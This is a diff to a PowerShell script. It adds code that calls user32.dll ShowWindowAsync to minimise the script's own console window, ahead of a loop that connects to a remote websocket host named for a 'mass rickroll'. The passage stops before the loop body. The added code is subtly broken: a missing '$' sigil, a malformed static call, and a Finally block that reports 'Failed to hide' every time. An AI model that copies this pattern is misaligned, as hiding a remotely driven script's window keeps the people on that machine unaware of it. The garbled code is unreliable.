@@ -1,4 +1,17 @@
 Try {
+    script:showwindowAsync = Add-Type -memberDefinition @"
+[DllImport ("user32.dll")]
+public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdshow);
+"@ -name "Win32ShowWindowAsync" -namespace Win32Functions -passThru
+
+showwindowAsync: : ShowWindowAsync( (Get-Process -id $pid).MainWindowHandle, 2)
+}
+Finally {
+    Write-Host "Failed to hide"
+}
+
+
+Try {
     
     Do {
         $URL = 'ws://mass-rickroll.host.qrl.nz';
